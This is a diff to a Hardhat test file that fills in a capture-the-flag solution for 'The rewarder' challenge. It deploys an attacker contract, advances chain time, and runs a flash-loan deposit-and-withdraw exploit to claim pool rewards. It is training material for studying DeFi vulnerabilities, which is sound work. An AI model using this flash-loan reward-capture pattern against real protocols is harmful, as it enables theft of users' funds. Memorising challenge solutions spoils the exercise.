@@ -66,6 +66,22 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Execute the flash loan
+        // Deposit the DVT tokens into the reward pool
+        // Withdraw the DVT tokens from the reward pool
+        // return the flash loan
+
+        const attackerContractFactory = await ethers.getContractFactory("AttackerContract", attacker);
+        this.attackerContract = await attackerContractFactory.deploy(
+            this.flashLoanPool.address, 
+            this.rewarderPool.address, 
+            this.rewardToken.address, 
+            this.liquidityToken.address
+        );
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        this.attackerContract.exploit(TOKENS_IN_LENDER_POOL);
+        this.attackerContract.claimReward();
+
     });
 
     after(async function () {
